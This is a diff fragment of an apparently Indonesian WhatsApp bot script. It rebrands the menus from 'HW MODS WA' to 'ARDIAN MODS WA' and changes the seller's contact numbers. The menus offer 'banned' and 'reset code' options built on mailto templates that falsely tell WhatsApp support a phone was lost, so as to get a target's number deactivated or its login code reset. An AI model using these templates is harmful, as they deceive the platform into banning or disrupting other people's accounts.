-haikal-
-Wa.me/6289653784091?text=Bang+Jasa+Run
+ardian-
+Wa.me/6283183387983?text=Bang+Jasa+Run
 
 Haikal-
-Wa.me/6281214281312?text=Bang+Jasa+Run
+Wa.me/6283183387983?text=Bang+Jasa+Run
 
 lanzx-
-Wa.me/6281337782589?text=Bang+Jasa+Run`)
+Wa.me/6283183387983?text=Bang+Jasa+Run`)
 }
 break
 case 'bagaimanakah':
@@ -2510,7 +2510,7 @@ break
 case 'jualan':
 touchmebree = [
 {
-title: `©️ HW MODS WA`,
+title: `©️ ARDIAN MODS WA`,
 rows: [
 {title: `PANEL`, rowId: `${prefix}panel`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -2544,7 +2544,7 @@ break
 case 'listwibu':
 touchmebree = [
 {
-title: `©️ HW MODS WA`,
+title: `©️ ARDIAN MODS WA`,
 rows: [
 {title: `WIBU 1`, rowId: `${prefix}kill`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -2608,7 +2608,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `BANNED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` HW MODS WA`,
+footer: ` ARDIAN MODS WA`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `BANNED`, url: 'mailto:support@whatsapp.com?Body=Hello,%20please%20deactivate%20this%20number,%20because%20I%20have%20lost%20my%20cellphone%20and%20someone%20is%20using%20my%20number,%20please%20deactivate%20my%20number:%2B+62xxxxxx'}}],
 headerType: 1
@@ -2623,7 +2623,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `UNBANED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` HW MODS WA`,
+footer: ` ARDIAN MODS WA`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `UNBANED`, url: 'mailto:support@whatsapp.com?Body=Please%20reactivate%20my%20number%20because%20I%20didnt%20violate%20any%20WhatsApp%20rules,%20suddenly%20my%20number%20was%20banned,%20please%20reactivate%20this%20number:%2B+62xxxxxxx%20because%20I%20didnt%20do%20anything%20wrong,%20suddenly%20my%20number%20was%20banned%20when%20I%20entered%20the%20group%20so%20I%20ask%20the%20respectable%20WhatsApp%20party,%20please%20reactivate%20my%20number,%20thank%20you'}}],
 headerType: 1
@@ -2638,7 +2638,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `UNBANED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` HW MODS WA`,
+footer: ` ARDIAN MODS WA`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `RESET CODE`, url: 'mailto:support@whatsapp.com?Body=Please%20research%20the%20OTP%20code%20for%20this%20number%20because%20someone%20else%20accidentally%20logged%20in%20with%20my%20number%20and%20I%20had%20to%20wait%208%20hours,%20please%20research%20again%20at%20this%20number:%2B+62xxxxx'}}],
 headerType: 1
@@ -2649,7 +2649,7 @@ break
 case 'methodeband':
 touchmebree = [
 {
-title: `©️ HW MODS WA`,
+title: `©️ ARDIAN MODS WA`,
 rows: [
 {title: `BANNED`, rowId: `${prefix}banned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
